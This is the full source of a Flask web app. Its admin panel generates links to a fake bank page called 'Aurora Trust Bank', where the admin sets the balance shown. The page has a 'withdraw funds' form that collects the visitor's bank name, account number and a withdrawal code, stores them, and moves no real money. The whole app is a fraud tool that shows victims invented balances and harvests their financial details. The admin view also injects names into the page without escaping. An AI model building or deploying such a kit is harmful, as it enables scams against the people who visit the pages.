# app.py — Flask + Neon Postgres. no local disk, no telegram. redeploy-safe.
import os, uuid, hashlib, secrets, psycopg2, psycopg2.extras
from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session, abort
from functools import wraps

DATABASE_URL = os.environ.get("DATABASE_URL", "").strip()

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

# ---------------- db ----------------

def get_conn():
    return psycopg2.connect(DATABASE_URL)

def init_db():
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("""
            CREATE TABLE IF NOT EXISTS config (
                key TEXT PRIMARY KEY,
                value TEXT
            );
        """)
        cur.execute("""
            CREATE TABLE IF NOT EXISTS links (
                slug TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                currency TEXT NOT NULL DEFAULT 'USD',
                balance REAL NOT NULL DEFAULT 0,
                withdraw_code TEXT NOT NULL,
                withdrawn BOOLEAN NOT NULL DEFAULT FALSE,
                bank TEXT,
                account TEXT,
                withdrawn_amount REAL,
                created BIGINT NOT NULL
            );
        """)
        conn.commit()

def get_admin_hash():
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("SELECT value FROM config WHERE key='admin_hash'")
        row = cur.fetchone()
        return row[0] if row else None

def set_admin_hash(h):
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("""
            INSERT INTO config (key, value) VALUES ('admin_hash', %s)
            ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value
        """, (h,))
        conn.commit()

def hash_pw(pw):
    salt = secrets.token_hex(16)
    return salt + ":" + hashlib.sha256((salt + pw).encode()).hexdigest()

def check_pw(pw, stored):
    if not stored: return False
    try: salt, h = stored.split(":", 1)
    except ValueError: return False
    return hashlib.sha256((salt + pw).encode()).hexdigest() == h

def db_list_links():
    with get_conn() as conn, conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
        cur.execute("SELECT * FROM links ORDER BY created DESC")
        return [dict(r) for r in cur.fetchall()]

def db_get_link(slug):
    with get_conn() as conn, conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
        cur.execute("SELECT * FROM links WHERE slug=%s", (slug,))
        row = cur.fetchone()
        return dict(row) if row else None

def db_put_link(rec):
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("""
            INSERT INTO links (slug, name, currency, balance, withdraw_code, withdrawn, bank, account, withdrawn_amount, created)
            VALUES (%(slug)s, %(name)s, %(currency)s, %(balance)s, %(withdraw_code)s, %(withdrawn)s, %(bank)s, %(account)s, %(withdrawn_amount)s, %(created)s)
            ON CONFLICT (slug) DO UPDATE SET
                name=EXCLUDED.name, currency=EXCLUDED.currency, balance=EXCLUDED.balance,
                withdraw_code=EXCLUDED.withdraw_code, withdrawn=EXCLUDED.withdrawn,
                bank=EXCLUDED.bank, account=EXCLUDED.account, withdrawn_amount=EXCLUDED.withdrawn_amount
        """, {
            "slug": rec["slug"], "name": rec["name"], "currency": rec["currency"],
            "balance": rec["balance"], "withdraw_code": rec["withdraw_code"],
            "withdrawn": rec.get("withdrawn", False), "bank": rec.get("bank"),
            "account": rec.get("account"), "withdrawn_amount": rec.get("withdrawn_amount"),
            "created": rec.get("created", 0),
        })
        conn.commit()

def db_delete_link(slug):
    with get_conn() as conn, conn.cursor() as cur:
        cur.execute("DELETE FROM links WHERE slug=%s", (slug,))
        conn.commit()

# ---------------- auth ----------------

def admin_required(f):
    @wraps(f)
    def w(*a, **k):
        if not session.get("admin"): return redirect(url_for("admin_page"))
        return f(*a, **k)
    return w

# ---------------- html (same as before) ----------------

ADMIN_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>Admin</title>
<style>
body{background:#0b0f1a;color:#e8eefc;font-family:system-ui;margin:0;padding:2rem}
.container{max-width:1100px;margin:0 auto}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:2rem}
@media(max-width:900px){.grid{grid-template-columns:1fr}}
.card{background:#111827;padding:1.5rem;border-radius:16px;box-shadow:0 10px 40px rgba(0,0,0,.5)}
label{display:block;font-size:.85rem;color:#9aa7c7;margin-top:.8rem}
input,select{width:100%;padding:.6rem;margin-top:.3rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:8px;box-sizing:border-box}
button{padding:.7rem 1.2rem;background:#2563eb;color:#fff;border:0;border-radius:8px;cursor:pointer;font-weight:600;margin-top:1rem}
table{width:100%;border-collapse:collapse;margin-top:1rem}
th,td{padding:.6rem;border-bottom:1px solid #1f2a44;text-align:left;font-size:.9rem;vertical-align:top}
th{color:#9aa7c7;font-weight:500}
a{color:#60a5fa;word-break:break-all}
.code{font-family:monospace;background:#0b1220;padding:.15rem .4rem;border-radius:6px}
.err{color:#f87171}.ok{color:#4ade80}
</style></head><body>
<div class="container">
{% if not authed %}
  <div class="card" style="max-width:380px;margin:4rem auto">
    <h3 style="margin-top:0">{{ 'Set admin password' if first_run else 'Admin login' }}</h3>
    <form method="post" action="{{ url_for('admin_setpw' if first_run else 'admin_login') }}">
      <label>Password</label><input name="password" type="password" required autofocus>
      {% if first_run %}<label>Confirm</label><input name="confirm" type="password" required>{% endif %}
      <button>{{ 'Set password' if first_run else 'Sign in' }}</button>
    </form>
    {% if error %}<div class="err" style="margin-top:.8rem">{{ error }}</div>{% endif %}
  </div>
{% else %}
  <h1 style="margin-top:0">Admin</h1>
  <div class="grid">
    <div class="card">
      <h3 style="margin-top:0">Generate share link</h3>
      <form id="gen">
        <label>Display name</label><input name="name" required>
        <label>Currency</label>
        <select name="currency"><option>USD</option><option>EUR</option><option>GBP</option><option>NGN</option><option>JPY</option><option>CAD</option></select>
        <label>Balance</label><input name="balance" type="number" step="0.01" required value="0">
        <label>Withdrawal code</label><input name="withdraw_code" required>
        <button>Generate</button>
      </form>
      <div id="out" style="margin-top:1rem"></div>

      <hr style="border-color:#1f2a44;margin:1.5rem 0">
      <h4 style="margin-top:0">Change password</h4>
      <form id="chpw">
        <label>Current</label><input name="current" type="password" required>
        <label>New</label><input name="new" type="password" required>
        <button>Update</button>
      </form>
      <div id="pwmsg" style="margin-top:.6rem"></div>
    </div>

    <div class="card">
      <h3 style="margin-top:0">Existing links</h3>
      <div id="list">loading…</div>
    </div>
  </div>
  <script>
  async function load(){
    const r=await fetch('/admin/api/links');
    const data=await r.json();
    const el=document.getElementById('list');
    if(!data.length){el.textContent='no links yet';return;}
    let h='<table><tr><th>name</th><th>cur</th><th>bal</th><th>code</th><th>link</th><th>state</th><th></th></tr>';
    for(const l of data){
      h+=`<tr><td>${l.name}</td><td>${l.currency}</td><td>${l.balance}</td>
      <td><span class="code">${l.withdraw_code}</span></td>
      <td><a href="/v/${l.slug}" target="_blank">/v/${l.slug}</a></td>
      <td>${l.withdrawn?'withdrawn':'active'}</td>
      <td><button data-slug="${l.slug}" class="del" style="background:#7f1d1d">del</button></td></tr>`;
    }
    el.innerHTML=h+'</table>';
    el.querySelectorAll('.del').forEach(b=>b.onclick=async()=>{
      if(!confirm('delete?'))return;
      await fetch('/admin/api/links/'+b.dataset.slug,{method:'DELETE'});
      load();
    });
  }
  document.getElementById('gen').onsubmit=async(e)=>{
    e.preventDefault();
    const body=Object.fromEntries(new FormData(e.target).entries());
    body.balance=parseFloat(body.balance);
    const r=await fetch('/admin/api/links',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const d=await r.json();
    const url=location.origin+'/v/'+d.slug;
    document.getElementById('out').innerHTML=`link: <a href="${url}" target="_blank">${url}</a>`;
    e.target.reset(); load();
  };
  document.getElementById('chpw').onsubmit=async(e)=>{
    e.preventDefault();
    const body=Object.fromEntries(new FormData(e.target).entries());
    const r=await fetch('/admin/api/password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
    const d=await r.json();
    const m=document.getElementById('pwmsg');
    m.textContent=d.ok?'password updated':(d.error||'failed');
    m.className=d.ok?'ok':'err';
    if(d.ok) e.target.reset();
  };
  load();
  </script>
{% endif %}
</div></body></html>
"""

def render_admin(authed=False, first_run=False, error=None):
    return render_template_string(ADMIN_HTML, authed=authed, first_run=first_run, error=error)

# ---------------- routes ----------------

@app.route("/admin")
def admin_page():
    if session.get("admin"): return render_admin(authed=True)
    return render_admin(authed=False, first_run=get_admin_hash() is None)

@app.route("/admin/login", methods=["POST"])
def admin_login():
    if check_pw(request.form.get("password",""), get_admin_hash()):
        session["admin"]=True
        return redirect(url_for("admin_page"))
    return render_admin(authed=False, error="wrong password")

@app.route("/admin/setpw", methods=["POST"])
def admin_setpw():
    if get_admin_hash() is not None:
        return redirect(url_for("admin_page"))
    pw=request.form.get("password",""); cf=request.form.get("confirm","")
    if pw!=cf or len(pw)<4:
        return render_admin(authed=False, first_run=True, error="passwords must match (min 4)")
    set_admin_hash(hash_pw(pw))
    session["admin"]=True
    return redirect(url_for("admin_page"))

@app.route("/admin/api/password", methods=["POST"])
@admin_required
def change_pw():
    d=request.get_json(force=True)
    if not check_pw(d.get("current",""), get_admin_hash()):
        return jsonify({"error":"current password wrong"}),403
    n=d.get("new","")
    if len(n)<4: return jsonify({"error":"min 4 chars"}),400
    set_admin_hash(hash_pw(n))
    return jsonify({"ok":True})

@app.route("/admin/api/links", methods=["GET"])
@admin_required
def list_links():
    return jsonify(db_list_links())

@app.route("/admin/api/links", methods=["POST"])
@admin_required
def create_link():
    d=request.get_json(force=True)
    name=(d.get("name") or "").strip()
    cur=(d.get("currency") or "USD").strip()
    bal=float(d.get("balance") or 0)
    code=(d.get("withdraw_code") or "").strip()
    if not name or not code: return jsonify({"error":"name and code required"}),400
    slug=uuid.uuid4().hex
    rec={"slug":slug,"name":name,"currency":cur,"balance":bal,"withdraw_code":code,
         "withdrawn":False,"bank":None,"account":None,"withdrawn_amount":None,
         "created":int(__import__("time").time())}
    db_put_link(rec)
    return jsonify({"slug":slug})

@app.route("/admin/api/links/<slug>", methods=["DELETE"])
@admin_required
def delete_link(slug):
    db_delete_link(slug)
    return jsonify({"ok":True})

# ---------------- user ----------------

USER_HTML = """
<!doctype html><html><head><meta charset="utf-8"><title>{{ name }} — Account</title>
<style>
body{background:#0b0f1a;color:#e8eefc;font-family:system-ui;margin:0}
.topbar{display:flex;justify-content:space-between;padding:1rem 2rem;border-bottom:1px solid #1f2a44}
.logo{font-weight:700}
.wrap{max-width:900px;margin:2rem auto;padding:0 1rem}
.hero{background:linear-gradient(135deg,#1e3a8a,#1e293b);padding:2rem;border-radius:20px}
.label{color:#9aa7c7;font-size:.85rem;text-transform:uppercase}
.balance{font-size:2.6rem;font-weight:700;margin:.4rem 0}
.panel{background:#111827;padding:1.5rem;border-radius:16px;margin-top:1.5rem}
input{width:100%;padding:.7rem;background:#0b1220;border:1px solid #1f2a44;color:#e8eefc;border-radius:8px;box-sizing:border-box;margin-top:.4rem}
button{padding:.7rem 1.2rem;border:0;border-radius:10px;cursor:pointer;font-weight:600;margin-top:1rem}
.primary{background:#22c55e;color:#06210f}
.msg{margin-top:.8rem;font-size:.9rem}
.err{color:#f87171}.ok{color:#4ade80}
</style></head><body>
<div class="topbar"><div class="logo">Aurora Trust Bank</div><div>{{ name }}</div></div>
<div class="wrap">
  <div class="hero">
    <div class="label">Available balance</div>
    <div class="balance">{{ currency }} {{ "%.2f"|format(balance) }}</div>
    <div class="label">Account holder</div><div style="font-size:1.1rem;margin-top:.2rem">{{ name }}</div>
  </div>
  <div class="panel">
    {% if withdrawn %}
      <div class="msg err">This account has already been processed.</div>
    {% else %}
    <h3 style="margin-top:0">Withdraw funds</h3>
    <label>Bank name</label><input id="bank" placeholder="e.g. Chase, GTBank">
    <label>Account number</label><input id="acct">
    <label>Amount ({{ currency }})</label><input id="amt" type="number" step="0.01">
    <label>Withdrawal code</label><input id="code" type="password">
    <button class="primary" onclick="go()">Submit</button>
    <div class="msg" id="msg"></div>
    {% endif %}
  </div>
</div>
<script>
async function go(){
  const msg=document.getElementById('msg');
  const body={
    bank:document.getElementById('bank').value.trim(),
    account:document.getElementById('acct').value.trim(),
    amount:parseFloat(document.getElementById('amt').value||'0'),
    code:document.getElementById('code').value
  };
  if(!body.bank||!body.account){msg.className='msg err';msg.textContent='bank + account required';return;}
  msg.className='msg';msg.textContent='processing…';
  const r=await fetch(location.pathname+'/withdraw',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
  const d=await r.json();
  if(r.ok&&d.ok){msg.className='msg ok';msg.textContent='Withdrawal approved.';}
  else{msg.className='msg err';msg.textContent=d.error||'failed';}
}
</script>
</body></html>
"""

@app.route("/v/<slug>")
def view_account(slug):
    rec=db_get_link(slug)
    if not rec: abort(404)
    return render_template_string(USER_HTML,name=rec["name"],currency=rec["currency"],
                                   balance=rec["balance"],withdrawn=rec.get("withdrawn",False))

@app.route("/v/<slug>/withdraw", methods=["POST"])
def withdraw(slug):
    d=request.get_json(force=True)
    rec=db_get_link(slug)
    if not rec: return jsonify({"error":"not found"}),404
    if rec.get("withdrawn"): return jsonify({"error":"already processed"}),400
    if (d.get("code") or "").strip()!=rec["withdraw_code"]:
        return jsonify({"error":"invalid withdrawal code"}),403
    bank=(d.get("bank") or "").strip()
    acct=(d.get("account") or "").strip()
    if not bank or not acct: return jsonify({"error":"bank and account required"}),400
    amt=float(d.get("amount") or 0)
    if amt<=0 or amt>rec["balance"]: return jsonify({"error":"invalid amount"}),400
    rec["balance"]-=amt
    rec["withdrawn"]=True
    rec["bank"]=bank
    rec["account"]=acct
    rec["withdrawn_amount"]=amt
    db_put_link(rec)
    return jsonify({"ok":True})

# ---------------- boot ----------------

init_db()

if __name__=="__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT",5000)))